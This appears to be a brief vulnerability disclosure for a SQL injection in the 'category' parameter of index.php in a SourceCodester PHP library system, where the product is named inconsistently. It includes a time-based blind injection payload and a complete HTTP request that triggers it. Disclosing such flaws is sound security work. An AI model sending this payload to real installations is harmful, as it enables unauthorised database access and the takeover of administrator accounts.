**BUG_Author:**

Rone

**Vendor:**

[SourceCodester](https://vuldb.com/?vendor.sourcecodester)

**Software:**

Library System using PHP/MySQli with Source Code | SourceCodester](https://www.sourcecodester.com/php/12275/library-system-using-php.html)

**Vulnerability File:**
index.php

**Description:**

SerBermz Book Management System Exists SQL Injection Vulnerability on Index.php Page

The parameter category was not processed correctly. Hackers can exploit this vulnerability to manipulate the administrator account of the system and have complete control over account information.

Status: Critical

SQL injection exists for GET parameter category

Payload:if(now()=sysdate(),sleep(4),0)

GET /libsystem/index.php?category=if(now()=sysdate(),sleep(4),0) HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

![image-20231010235824835](C:\Users\Rone\Desktop\image\image-20231010235824835.png)









